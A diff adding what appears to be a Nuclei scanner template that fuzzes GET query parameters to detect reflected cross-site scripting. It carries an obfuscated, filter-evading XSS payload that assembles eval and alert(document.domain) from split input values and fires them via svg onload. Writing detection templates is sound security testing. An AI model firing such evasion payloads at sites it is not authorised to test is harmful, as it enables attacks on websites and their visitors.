@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-input
+
+info:
+  name: Custom Reflection XSS Detection with Input Payload
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a complex input payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
